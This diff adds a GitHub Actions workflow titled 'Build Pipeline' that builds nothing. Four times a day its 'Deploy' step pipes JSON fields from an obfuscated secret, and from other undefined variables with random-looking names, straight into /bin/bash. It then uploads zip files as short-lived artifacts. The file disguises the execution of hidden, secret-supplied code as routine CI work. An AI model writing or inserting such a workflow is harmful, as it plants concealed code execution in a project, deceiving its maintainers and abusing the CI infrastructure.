@@ -1,0 +1,32 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '9 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          zish364: ${{ secrets.zish364 }}
+        run: |
+          printf '%s' "$zish364" | jq -r .rw0 | /bin/bash
+          printf '%s' "$qaf74730" | jq -r .qacor2723 | /bin/bash
+          echo $blm31294 | jq -r .xni116 | /bin/bash
+          printf '%s' "$rx4" | jq -r .w1 | /bin/bash
+          printf '%s' "$mlz110" | jq -r .awr29868 | /bin/bash
+
+      - name: Save results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: DkiEleBH
+          path: "*.zip"
+          retention-days: 1
